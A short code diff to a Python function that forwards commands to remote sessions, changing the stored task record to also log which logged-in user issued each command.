@@ -57,7 +57,7 @@ def session_cmd():
 			session_thread = owner_sessions[session_uid]
 
 			# store issued task in database
-			task = task_dao.handle_task({'task': command, 'session': session_thread.info.get('uid')})
+			task = task_dao.handle_task({'task': command, 'session': session_thread.info.get('uid'), 'issued_by': current_user.username})
 
 			# send task and get response
 			session_thread.send_task(task)
